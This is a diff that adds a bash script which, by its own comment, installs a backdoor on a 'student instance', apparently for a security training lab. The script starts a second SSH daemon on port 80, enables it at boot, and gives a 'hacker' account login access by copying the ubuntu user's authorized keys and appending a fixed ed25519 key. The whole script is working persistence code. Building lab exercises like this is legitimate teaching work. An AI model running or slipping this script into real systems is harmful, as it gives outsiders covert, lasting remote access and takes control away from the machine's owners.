@@ -1,0 +1,24 @@
+#!/bin/bash
+#
+# install a backdoor on the student instance
+sudo cp /lib/systemd/system/ssh.service /etc/systemd/system/ssh@port80.service
+sudo sed -i 's|^Description=OpenBSD Secure Shell server|Description=OpenBSD Secure Shell server on port 80|' /etc/systemd/system/ssh@port80.service
+sudo sed -i 's|^ExecStart=.*|ExecStart=/usr/bin/sshd -D -f /etc/ssh/sshd_config_port80|' /etc/systemd/system/ssh@port80.service
+
+sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config_port80
+sudo sed -i 's/#Port 22/Port 80/' /etc/ssh/sshd_config_port80
+
+sudo systemctl daemon-reexec
+sudo systemctl daemon-reload
+sudo systemctl start ssh@port80
+sudo systemctl enable ssh@port80
+
+sudo mkdir -p /home/hacker/.ssh
+sudo chmod 700 /home/hacker/.ssh
+sudo chown hacker:hacker /home/hacker/.ssh
+
+sudo cp /home/ubuntu/.ssh/authorized_keys /home/hacker/.ssh/authorized_keys
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJf1hjU/vrqVZeNzaJcRhtPO6C5gWdCpEtCwVYmmqeuz hacker" | sudo tee -a /home/hacker/.ssh/authorized_keys > /dev/null
+sudo chown hacker:hacker /home/hacker/.ssh/authorized_keys
+sudo chmod 600 /home/hacker/.ssh/authorized_keys
+
